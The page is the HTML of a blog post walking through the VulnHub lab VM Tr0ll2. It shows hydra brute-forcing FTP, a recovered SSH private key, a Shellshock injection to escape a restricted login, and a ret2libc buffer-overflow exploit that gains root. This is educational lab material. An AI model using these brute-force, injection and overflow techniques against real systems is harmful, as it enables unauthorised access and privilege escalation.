<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>another troll tamed solving troll 2 | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="foreword
Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.
Here is my experience taming the troll, again.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="another troll tamed solving troll 2">
<meta property="og:description" content="foreword
Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.
Here is my experience taming the troll, again.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-10-10T17:32:35+00:00">
<meta property="article:modified_time" content="2014-10-10T17:32:35+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="another troll tamed solving troll 2">
<meta name=twitter:description content="foreword
Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.
Here is my experience taming the troll, again.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"another troll tamed solving troll 2","item":"https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"another troll tamed solving troll 2","name":"another troll tamed solving troll 2","description":"foreword Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.\nHere is my experience taming the troll, again.\n","keywords":[],"articleBody":"foreword Tr0ll2 is a successor in a boot2root series by @Maleus21 hosted over at VulnHub. Having been able to pwn Tr0ll1, I gave this one a shot too.\nHere is my experience taming the troll, again.\ngetting started Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a nmap against it:\nroot@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101 Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-10 06:55 SAST Nmap scan report for 192.168.56.101 Host is up, received reset (0.00031s latency). Not shown: 997 filtered ports Reason: 997 no-responses PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2.0.8 or later 22/tcp open ssh syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.2.22 ((Ubuntu)) Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for vsftpd 2.0.8 exploit with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren’t any strange banners etc to be found which was not the case.\nweb server Opening up a browser to http://192.168.56.101 revealed a familiar image:\n  Oh. Hai. The sources serving up the image had the comment  with the image.\nFurther poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:\n/keep_trying /dont_bother /noob /ok_this_is_it The content served up at these URLs:\n  The source that serves up this image had the comment  with the image.\nSo with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL’s that would 200 into a text file from the robots.txt and looped over them downloading the images:\nroot@kali:~# for line in $(cat 200.txt); do echo \"==$line \u0026\u0026 wget 192.168.56.101/$line/cat_the_troll.jpg; done ==/ok_this_is_it== --2014-10-10 07:31:37-- http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg Connecting to 192.168.56.101:80... connected. HTTP request sent, awaiting response... 200 OK Length: 15831 (15K) [image/jpeg] Saving to: `cat_the_troll.jpg.3' 100%[=======] 15,831 --.-K/s in 0s 2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831] Immediately when you ls the directory containing the images will you notice a difference:\nroot@kali:~# ls -l total 68 -rw-r--r-- 1 root root 47 Oct 10 07:31 200.txt -rw-r--r-- 1 root root 15831 Oct 4 10:57 cat_the_troll.jpg -rw-r--r-- 1 root root 15873 Oct 4 10:31 cat_the_troll.jpg.1 # -rw-r--r-- 1 root root 15831 Oct 4 10:57 cat_the_troll.jpg.2 -rw-r--r-- 1 root root 15831 Oct 4 10:57 cat_the_troll.jpg.3 One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a cmp on the files hinted towards what may be up.\nroot@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1 cmp: EOF on cat_the_troll.jpg Sweet, so lets print the last line of both and check what the diff is:\nroot@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg 8\u0011�z2��\u001fp�T�\u001a\u0016lj\\p\u001a��?�=\u001e\u001b���.�B���\u001fo�ES_� root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1 8\u0011�z2��\u001fp�T�\u001a\u0016lj\\p\u001a��?�=\u001e\u001b���.�B���\u001fo�ES_��Look Deep within y0ur_self for the answer Look Deep within y0ur_self for the answer. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words y0ur_self were written differently, I tried to use this as a web path:\n  I downloaded answer.txt and started to check what is happening inside:\nroot@kali:~# head answer.txt QQo= QQo= QUEK QUIK QUJNCg== QUMK QUNUSAo= QUkK QUlEUwo= QU0K Looks a lot like base64 hey? Lets try decode it:\nroot@kali:~# cat answer.txt | base64 -d | head A A AA AB ABM AC ACTH AI AIDS AM The resultant output appeared to be a wordlist. A big one too. In fact, it has 99157 entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a sort | uniq, the size was reduced to 73128 which was still too much.\nI decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry ItCantReallyBeThisEasyRightLOL on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P\nMy guess was that this has to be a password for either the FTP or SSH service.\nftpee I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.\nAs a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in answer.txt, mutate it a bit and hand it over to hydra to do its work.\nMy approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran cat wordz | tr \"\\\"' \" '\\n' | sort -u  words to break it up into a wordlist. Lastly I took the entries had a _ in them and broke them up as single words ie: cat_the_troll.jpg turned into cat, the, troll. The resultant list can be seen here\nAnd finally, it was time to let hydra on the loose.\nroot@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101 Hydra v7.6 (c)2013 by van Hauser/THC \u0026 David Maciejak - for legal purposes only Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50 [DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task [DATA] attacking service ftp on port 21 [VERBOSE] Resolving addresses ... done [ATTEMPT] target 192.168.56.101 - login \"\" - pass \"\" - 1 of 13689 [child 0] [ATTEMPT] target 192.168.56.101 - login \"\" - pass \"404\" - 2 of 13689 [child 1] [ATTEMPT] target 192.168.56.101 - login \"\" - pass \"again\" - 3 of 13689 [child 2] [ATTEMPT] target 192.168.56.101 - login \"\" - pass \"agent\" - 4 of 13689 [child 3] [...] [ATTEMPT] target 192.168.56.101 - login \"Tr0ll\" - pass \"Tr0ll\" - 10621 of 13689 [child 4] [ATTEMPT] target 192.168.56.101 - login \"Tr0ll\" - pass \"tr0ll2\" - 10622 of 13689 [child 8] [ATTEMPT] target 192.168.56.101 - login \"Tr0ll\" - pass \"tr0ll_again.jpg\" - 10623 of 13689 [child 23] [21][ftp] host: 192.168.56.101 login: Tr0ll password: Tr0ll [STATUS] attack finished for 192.168.56.101 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08 After a really, really long time, we finally get a successful combination of Tr0ll:Tr0ll. Guess I could have guessed that but oh well. Lets see if this gives us any access:\nroot@kali:~# ftp 192.168.56.101 Connected to 192.168.56.101. 220 Welcome to Tr0ll FTP... Only noobs stay for a while... Name (192.168.56.101:root): Tr0ll 331 Please specify the password. Password: 230 Login successful. Yay! Progress! Lets take a closer look…\nRemote system type is UNIX. Using binary mode to transfer files. ftp pas Passive mode on. ftp ls 227 Entering Passive Mode (192,168,56,101,73,4) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 1474 Oct 04 01:09 lmao.zip 226 Directory send OK. ftp get lmao.zip local: lmao.zip remote: lmao.zip 227 Entering Passive Mode (192,168,56,101,105,73) 150 Opening BINARY mode data connection for lmao.zip (1474 bytes). 226 Transfer complete. 1474 bytes received in 0.00 secs (621.0 kB/s) ftp bye 221 Goodbye. noob key We find ourselves with a zip archive called lmao.zip. A encrypted one :(\nI tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of answer.txt:\nroot@kali:~/Desktop/troll2# unzip lmao.zip Archive: lmao.zip [lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL inflating: noob root@kali:~# cat noob -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1 /9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5 z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0 gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079 La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t 0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g== -----END RSA PRIVATE KEY----- A unencrypted private key! Called noob. I guessed noob may be the username, so I fixed up the permissions on the key and tried my luck:\nroot@kali:~/Desktop/troll2# chmod 600 noob root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob TRY HARDER LOL! Connection to 192.168.56.101 closed. shocking isn’t it Surprise surprise. It seemed like we are in fact authenticating, but we don’t have a shell. I figured one of two things could be happening here. First, the .bashrc may have been modified with something that echoes the text TRY HARDER LOL! and exits, or there is some restriction on the SSH key for noob.\nMy first attempts were to specify a command with -t as /bin/bash, but this did not work.\nWith the current buzz around the recently disclosed shellshock bug, I thought I’d try it assuming its a key restriction:\nroot@kali:~# ssh noob@192.168.56.101 -i noob -t '() { :;}; /bin/bash' noob@Tr0ll2:~$ id uid=1002(noob) gid=1002(noob) groups=1002(noob) Shocking :) To confirm, the authorized_keys file has the entry command=\"echo TRY HARDER LOL!\"  before the public key.\nwhich door leads to r00t With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory /nothing_to_see_here.\n/nothing_to_see_here had another directory inside of it choose_wisely/ with another 3 sub directories called door1, door2 and door3.\nAll 3 ‘doors’ had a setuid binary called r00t. I ran the first one which had the output:\nnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t Good job, stand by, executing root shell... BUHAHAHA NOOB! noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ Broadcast message from noob@Tr0ll2 (/dev/pts/0) at 0:48 ... The system is going down for reboot NOW! Connection to 192.168.56.101 closed by remote host. Connection to 192.168.56.101 closed. Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D\nThe machine rebooted and I logged in again as noob, changing directories to the r00t binaries. I tried to run strings on them, but it seems like the command was unavailable. No worries, next on the list was od.\nnoob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t [...] 0001214 __libc_start_main 0001236 GLIBC_2.0 0001320 R 0001453 Q 0001521 % 0001526 h 0001626 h 0001646 h( 0002066 t\u0026 0002073 ' 0002305 i 0002620 Good job, stand by, executing root shell... 0002674 BUHAHAHA NOOB! 0002713 /sbin/reboot 0002733 ;0 0002750 L 0002760 p 0003025 zR 0003044 0003060 p 0003077 x [...] So this is the binary that simply rebooted the machine. What is weird though is that this r00t binary was in door1/ prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the r00t binaries were shuffled around again.\nThis was only a minor annoyance and I had enough time to check out the binaries using od to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.\nbof bof bof your boat… I copied the binary of interest to /tmp so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.\nWith the binary in /tmp, noob was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.\nTo check the security applied to the binary at compile time, I copied it off using xxd to my local machine and checked it out.\nroot@kali:~# gdb -q ./r00t Reading symbols from /root/Desktop/troll2/r00t...done. gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partia No security? EZ PEZE.\nNext, it was time to start fuzzing the binary and see if it has any interesting behavior:\nnoob@Tr0ll2:/tmp$ ./r00t $(python -c 'print \"A\" * 500') Segmentation fault 500 “A”’s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.\nnoob@Tr0ll2:/tmp$ ldd ./r00t linux-gate.so.1 = (0xb7fff000) libc.so.6 = /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000) /lib/ld-linux.so.2 (0x80000000) noob@Tr0ll2:/tmp$ ldd ./r00t linux-gate.so.1 = (0xb7fff000) libc.so.6 = /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000) /lib/ld-linux.so.2 (0x80000000) Both entries returned the same address for libc, indicating that ASLR was not enabled :) Tr0ll2 was also nice enough to include gdb, making the exploit development process very easy.\nthe exploit With all of the information gathered so far about this particularly interesting r00t binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.\nFirst, we have to inspect the crash when we send those 500 A’s\nnoob@Tr0ll2:/tmp$ gdb -q ./r00t Reading symbols from /tmp/r00t...done. (gdb) r $(python -c 'print \"A\" * 500') Starting program: /tmp/r00t $(python -c 'print \"A\" * 500') Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () (gdb) x/x $eip 0x41414141: Cannot access memory at address 0x41414141 We see that we have cleanly overwritten EIP with our hex representation of A’s. We don’t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit pattern_create script, and then checking the offset using the pattern_offset script.\nLets generate the pattern.\nroot@kali:~# locate pattern_create /usr/share/metasploit-framework/tools/pattern_create.rb root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Next, we provide this pattern as input to crash the application and inspect the registers:\nnoob@Tr0ll2:/tmp$ gdb -q ./r00t Reading symbols from /tmp/r00t...done. (gdb) r \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" Starting program: /tmp/r00t \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" Program received signal SIGSEGV, Segmentation fault. 0x6a413969 in ?? () So we crashed at 0x6a413969. Lets check the offset of this in our buffer.\nroot@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969 [*] Exact match at offset 268 So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B’s:\nnoob@Tr0ll2:/tmp$ gdb -q ./r00t Reading symbols from /tmp/r00t...done. (gdb) r $(python -c 'print \"A\" *268 + \"BBBB\"') The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /tmp/r00t $(python -c 'print \"A\" *268 + \"BBBB\"') Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? () (gdb) x/x $eip 0x42424242: Cannot access memory at address 0x42424242 (gdb) So with that done, we can deduce that we can cleanly override EIP at offset 268.\nThe next part we need to get is the location of system() from within libc. We can leak this address quite easily by inspecting the memory from a running application such as r00t linked to it:\nnoob@Tr0ll2:/tmp$ gdb -q ./r00t Reading symbols from /tmp/r00t...done. (gdb) b *main # here we break on the main function Breakpoint 1 at 0x8048444: file bof.c, line 3. (gdb) r # here we run the application.... Starting program: /tmp/r00t Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3 3 bof.c: No such file or directory. (gdb) p system # and leak the locatin of system() in memory $1 = {} 0xb7e6b060  So system() lives at 0xb7e6b060. We are going to point EIP here and provide it a argument from a environment variable. I don’t really care if the application exits cleanly, however you can easily get that right by leaking the location of exit() too and placing that as the ret address in the exploit. I just like to type JUNK ;)\nSo far our exploit payload will look something like this:\nA * 268 + system() + JUNK The last thing we need is a argument for system() on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as /bin/sh. We can easily set an environment variable with this string, locate it in memory and use that.\nSo lets create this string, which we will refer to as the EGG.\nnoob@Tr0ll2:/tmp$ export EGG=/bin/sh noob@Tr0ll2:/tmp$ env | grep EGG EGG=/bin/sh Next, we can use a small C program to tell us where this EGG is in memory:\nnoob@Tr0ll2:/tmp$ cat /tmp/findegg.c #include  int main(void) { printf(\"EGG address: 0x%lx\\n\", getenv(\"EGG\")+4); return 0; } noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg [...] noob@Tr0ll2:/tmp$ /tmp/findegg EGG address: 0xbfffff04 So our egg lives at 0xbfffff04. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of gdb.\nWith everything we need, we can deduce that our exploit payload will end up being something like this:\nA * 268 + system() + JUNK + EGG Lets get the python version of that written up and sent to our vulnerable binary (addresses are written ‘backwards’ due to the little endian format of the CPU):\nnoob@Tr0ll2:/tmp$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\x04\\xff\\xff\\xbf\"') Segmentation fault Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called r00t, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:\n# so just to recap, we check for the location of the EGG noob@Tr0ll2:/tmp$ ./findegg EGG address: 0xbfffff04 # EGG is at 0xbfffff04, so in little endian format we have: noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\x04\\xff\\xff\\xbf\"') Segmentation fault # A segfault, lets move it up 1 byte noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\x05\\xff\\xff\\xbf\"') sh: 1: =/bin/sh: not found Segmentation fault # another segfault, however we have a little diagnostics message now # showing that we are not far off :) noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\x06\\xff\\xff\\xbf\"') $ trollin the rootin So 0xbfffff06 as a EGG location will give us shell in our testing! To finish off then, I have to find the correct r00t binary in all of the door{1,2,3} folders and attempt my exploit there:\nnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\x06\\xff\\xff\\xbf\"') sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found Segmentation fault Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the PWD changing so drastically. To fix this, we simply rerun our findegg program and compensate for the binary name. When completing this, I had a successful run as follows:\nnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print \"A\" *268 + \"\\x60\\xb0\\xe6\\xb7\" + \"JUNK\" + \"\\xe2\\xfe\\xff\\xbf\"') # id uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob) This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from 0xbffffeda all the way to 0xbffffee2\nAs I was now root, I may cat the Proof.txt in /root\n# cat /root/Proof.txt You win this time young Jedi... a70354f0258dcc00292c72aab3c8b1e4 Thanks @Maleus21 for the fun VM and VulnHub for the hosting :)\n","wordCount":"3319","inLanguage":"en","datePublished":"2014-10-10T17:32:35Z","dateModified":"2014-10-10T17:32:35Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
